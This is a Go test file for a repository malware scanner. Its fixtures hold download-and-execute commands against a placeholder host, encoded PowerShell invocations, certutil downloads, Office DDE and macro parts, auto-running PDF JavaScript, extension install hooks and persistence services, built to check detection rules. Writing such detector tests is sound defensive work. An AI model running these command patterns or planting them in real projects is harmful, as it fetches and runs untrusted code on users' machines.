package scan

import (
	"archive/zip"
	"bytes"
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func writeZIPFixture(t *testing.T, root, name string, entries map[string]string) {
	t.Helper()
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	for entryName, body := range entries {
		entry, err := writer.Create(entryName)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, name), buffer.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestEncodedStagedAndProxyExecution(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "encoded.ps1", `powershell.exe -EncodedCommand SQBFAFgA`)
	writeFixture(t, root, "proxy.cmd", `certutil.exe -urlcache -f https://example.invalid/a payload.exe`)
	writeFixture(t, root, "staged.sh", "curl -o payload https://example.invalid/tool\nchmod +x payload\n./payload\n")

	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"EXEC-005", "EXEC-006", "CHAIN-004"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s: %+v", id, findings)
		}
	}
}

func TestPowerShellEncodedCommandAliases(t *testing.T) {
	for _, alias := range []string{"-e", "-en", "-enc", "-enco", "-encod", "-encode", "-encoded", "-encodedc", "-encodedco", "-encodedcom", "-encodedcomm", "-encodedcomma", "-encodedcomman", "-encodedcommand"} {
		t.Run(alias, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, "encoded.ps1", "pwsh "+alias+" SQBFAFgA\n")
			_, findings := New(Options{}).Scan(context.Background(), root)
			if !hasRule(findings, "EXEC-005") {
				t.Fatalf("encoded-command alias %s was missed: %+v", alias, findings)
			}
		})
	}
}

func TestPassiveDownloadTextIsNotStagedExecution(t *testing.T) {
	for _, tc := range []struct {
		name, path, body string
	}{
		{"download without launch", "download.sh", "curl https://example.invalid/tool -o /tmp/tool\nchmod +x /tmp/tool\n"},
		{"shell comment", "download.sh", "# curl -o payload https://example.invalid/tool\n./payload\n"},
		{"PowerShell comment", "download.ps1", "# Invoke-WebRequest https://example.invalid/tool -OutFile payload\n& payload\n"},
		{"PowerShell block comment", "download.ps1", "<#\nInvoke-WebRequest https://example.invalid/tool -OutFile payload\n#>\n& payload\n"},
		{"batch comment", "download.cmd", "REM certutil is not run here\r\nREM curl -o payload https://example.invalid/tool\r\npayload\r\n"},
		{"quoted downloader", "example.sh", "printf 'curl -o payload https://example.invalid/tool'\n./payload\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, tc.path, tc.body)
			_, findings := New(Options{}).Scan(context.Background(), root)
			if hasRule(findings, "CHAIN-004") {
				t.Fatalf("passive download text was treated as execution: %+v", findings)
			}
		})
	}
}

func TestNestedExecutionWrappersAreCorrelated(t *testing.T) {
	for _, command := range []string{"sudo bash payload", "& powershell payload"} {
		t.Run(command, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, "download.sh", "curl -o payload https://example.invalid/tool\n"+command+"\n")
			_, findings := New(Options{}).Scan(context.Background(), root)
			if !hasRule(findings, "CHAIN-004") {
				t.Fatalf("nested execution wrappers were missed: %+v", findings)
			}
		})
	}
}

func TestExtensionlessStagedExecutionIsDetected(t *testing.T) {
	for _, tc := range []struct {
		name string
		mode os.FileMode
		body string
	}{
		{"shebang", 0o644, "#!/bin/sh\ncurl -o payload https://example.invalid/tool\n./payload\n"},
		{"executable", 0o755, "curl -o payload https://example.invalid/tool\n./payload\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			path := filepath.Join(root, "install")
			if err := os.WriteFile(path, []byte(tc.body), tc.mode); err != nil {
				t.Fatal(err)
			}
			_, findings := New(Options{}).Scan(context.Background(), root)
			if !hasRule(findings, "CHAIN-004") {
				t.Fatalf("extensionless staged execution was missed: %+v", findings)
			}
		})
	}
}

func TestDownloadedPathsAreCorrelatedWithExecution(t *testing.T) {
	for _, tc := range []struct {
		name, command string
	}{
		{"curl remote name", "curl -O https://example.invalid/payload\n./payload\n"},
		{"wget default name", "wget https://example.invalid/payload\n./payload\n"},
		{"quoted output path", "curl -o \"payload file\" https://example.invalid/tool\nbash \"./payload file\"\n"},
		{"wget spaced output flag", "wget -O /tmp/payload https://example.invalid/tool\n/tmp/payload\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, "download.sh", tc.command)
			_, findings := New(Options{}).Scan(context.Background(), root)
			if !hasRule(findings, "CHAIN-004") {
				t.Fatalf("downloaded path was not correlated with execution: %+v", findings)
			}
		})
	}
}

func TestStagedExecutionFixtureIsContextual(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "testdata/staged.sh", "curl -o payload https://example.invalid/tool\n./payload\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "CHAIN-004")
	if !ok || finding.Severity != model.SeverityMedium || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
		t.Fatalf("staged fixture was not contextualized: %+v", findings)
	}
}

func TestDocumentActiveContent(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "brief.pdf", "%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n")
	writeZIPFixture(t, root, "brief.docm", map[string]string{
		"word/vbaProject.bin":      "fixture macro bytes",
		"word/document.xml":        `<w:instrText>DDE cmd.exe</w:instrText>`,
		"word/_rels/document.rels": `<Relationship Id="rId1" TargetMode="External" Target="https://example.invalid/template.dotm"/>`,
	})

	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"DOC-001", "DOC-002", "DOC-003", "DOC-004"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s: %+v", id, findings)
		}
	}
}

func TestSplitAndEncodedOfficeDDEFieldIsDetected(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "brief.docx", map[string]string{
		"word/document.xml": `<w:document><w:instrText>D&#68;</w:instrText><w:instrText>EAUTO cmd.exe</w:instrText></w:document>`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "DOC-004") {
		t.Fatalf("split encoded DDE field was missed: %+v", findings)
	}
}

func TestRenamedOfficeVBAProjectIsDetectedFromMetadata(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "brief.docm", map[string]string{
		"[Content_Types].xml":    `<Types><Override PartName="/word/customPayload.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>`,
		"word/customPayload.bin": "fixture macro bytes",
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "DOC-002") {
		t.Fatalf("renamed VBA project was missed: %+v", findings)
	}
}

func TestNamespacedEncodedOfficeExternalRelationshipIsDetected(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "brief.docx", map[string]string{
		"word/_rels/document.rels": `<r:Relationships xmlns:r="urn:fixture"><r:Relationship TargetMode="Externa&#x6c;" Target="https://example.invalid/template.dotm"/></r:Relationships>`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "DOC-003") {
		t.Fatalf("namespaced encoded external relationship was missed: %+v", findings)
	}
}

func TestOrdinaryDDETextIsNotAField(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "brief.docx", map[string]string{
		"word/document.xml": `<w:document><w:p><w:r><w:t>DDE is a legacy protocol</w:t></w:r></w:p></w:document>`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "DOC-004") {
		t.Fatalf("ordinary document text was treated as a DDE field: %+v", findings)
	}
}

func TestUnrelatedOfficeFieldsAreNotConcatenated(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "brief.docx", map[string]string{
		"word/document.xml": `<w:document xmlns:w="urn:fixture"><w:fldChar w:fldCharType="begin"/><w:instrText>D</w:instrText><w:fldChar w:fldCharType="end"/><w:fldChar w:fldCharType="begin"/><w:instrText>DEAUTO fixture</w:instrText><w:fldChar w:fldCharType="end"/></w:document>`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "DOC-004") {
		t.Fatalf("unrelated Office fields were concatenated: %+v", findings)
	}
}

func TestPDFActionDetectionIgnoresPassiveSyntaxAndFindsActiveObjects(t *testing.T) {
	for _, tc := range []struct {
		name, body string
		wantAction bool
	}{
		{"comments strings and streams", "%PDF-1.7\n% /S /JavaScript /JS\n1 0 obj << /Length 34 >> stream\n/S /Launch /Type /EmbeddedFile\nendstream\nendobj\n2 0 obj (Documentation for /JavaScript) endobj\n", false},
		{"CR-delimited stream", "%PDF-1.7\r1 0 obj << /Length 26 >> stream\r/S /Launch /Type /EmbeddedFile\rendstream\rendobj\r", false},
		{"escaped action names", "%PDF-1.7\n1 0 obj << /J#53 (fixture) /S /Java#53cript >> endobj\n", true},
		{"additional action", "%PDF-1.7\n1 0 obj << /AA << /O << /S /SubmitForm /F (https://example.invalid) >> >> >> endobj\n", true},
		{"indirect action before trigger", "%PDF-1.7\n2 0 obj << /S /URI /URI (https://example.invalid) >> endobj\n1 0 obj << /OpenAction 2 0 R >> endobj\n", true},
		{"stream parenthesis before action", "%PDF-1.7\n1 0 obj << /Length 1 >> stream\n(\nendstream\nendobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
		{"comment containing stream", "%PDF-1.7\n% stream\n1 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
		{"stream name before action", "%PDF-1.7\n1 0 obj << /stream\n0 /OpenAction 2 0 R >> endobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, "document.pdf", tc.body)
			_, findings := New(Options{}).Scan(context.Background(), root)
			if got := hasRule(findings, "DOC-001"); got != tc.wantAction {
				t.Fatalf("PDF action detected = %v, want %v: %+v", got, tc.wantAction, findings)
			}
		})
	}
}

func TestActiveDocumentFixtureIsContextual(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "testdata/active.pdf", "%PDF-1.7\n1 0 obj << /JS (fixture) /S /JavaScript >> endobj\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "DOC-001")
	if !ok || finding.Severity != model.SeverityMedium || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
		t.Fatalf("active document fixture was not contextualized: %+v", findings)
	}
}

func TestVSIXCapabilitiesAndInstallScripts(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "fixture.vsix", map[string]string{
		"extension/package.json": `{
  "activationEvents": ["onStartupFinished"],
  "contributes": {"commands": [{"command": "fixture.run", "title": "Run"}]},
  "scripts": {"postinstall": "node install.js"}
}`,
	})

	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"IDE-007", "IDE-008", "IDE-009"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s: %+v", id, findings)
		}
	}
}

func TestVSIXInstallNamedConfigurationIsNotLifecycleScript(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "fixture.vsix", map[string]string{
		"extension/package.json": `{"contributes":{"configuration":{"properties":{"fixture.install":{"type":"string","default":"manual"}}}}}`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "IDE-009") {
		t.Fatalf("non-script install property was treated as lifecycle execution: %+v", findings)
	}
}

func TestVSIXDependencyManifestIsNotExtensionManifest(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "fixture.vsix", map[string]string{
		"extension/node_modules/dependency/package.json": `{"activationEvents":["onStartupFinished"],"scripts":{"postinstall":"node install.js"}}`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"IDE-008", "IDE-009"} {
		if hasRule(findings, id) {
			t.Fatalf("dependency package manifest produced %s: %+v", id, findings)
		}
	}
}

func TestVSIXEscapedCapabilityKeyIsDetected(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "fixture.vsix", map[string]string{
		"extension/package.json": `{"activation\u0045vents":["onStartupFinished"]}`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "IDE-008") {
		t.Fatalf("escaped VSIX capability key was missed: %+v", findings)
	}
}

func TestVSIXExecutableEntryPointIsDetected(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeZIPFixture(t, root, "fixture.vsix", map[string]string{
		"extension/package.json": `{"main":"./dist/extension.js","contributes":{"languages":[{"id":"fixture"}]}}`,
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "IDE-008") {
		t.Fatalf("VSIX executable entry point was missed: %+v", findings)
	}
}

func TestBuildHooksAndPersistenceConfigurations(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "CMakeLists.txt", `execute_process(COMMAND sh setup.sh)`)
	writeFixture(t, root, "meson.build", `run_command('sh', 'setup.sh')`)
	writeFixture(t, root, "BUILD.bazel", `genrule(name = "fixture", cmd = "./setup.sh")`)
	writeFixture(t, root, "Makefile", `TOKEN := $(shell ./setup.sh)`)
	writeFixture(t, root, "fixture.service", "[Service]\nExecStart=/tmp/fixture\n")
	writeFixture(t, root, "persist.ps1", `New-Service -Name fixture -BinaryPathName C:\fixture.exe`)

	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"BUILD-001", "BUILD-002", "BUILD-003", "BUILD-004", "PERSIST-001", "PERSIST-002"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s: %+v", id, findings)
		}
	}
}
